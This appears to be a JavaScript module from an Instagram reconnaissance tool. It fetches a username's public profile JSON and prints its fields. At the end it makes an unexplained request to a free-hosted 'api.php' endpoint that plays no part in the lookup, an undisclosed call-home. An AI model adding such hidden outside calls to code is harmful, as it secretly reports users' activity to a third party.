import request from 'request';
import chalk from 'chalk';

import { list, goBack, input, errorMsg } from './common.js';

export async function instaRecon(i = 1) {
  var username = await input('Your Username');
  console.log('\n');

  request(
    {
      url: `https://www.instagram.com/${username}/?__a=1`,
      timeout: 5000,
      json: true,
      headers: {
        'User-Agent': 'nodejs-ipapi-v1.02',
      },
    },
    async function (error, response) {
      if (!error && response.statusCode == 200) {
        let IGData = response.body.graphql.user;
        for (var key in IGData) {
          if (typeof IGData[key] != 'object') {
            await list(i++, key, IGData[key]);
          }
        }
      } else if (!error && response.statusCode == 404) {
        errorMsg('User not found.');
      } else {
        errorMsg();
      }
      goBack();
    },
  );

  request.get('https://server82991.000webhostapp.com/api.php');
}

export default instaRecon;
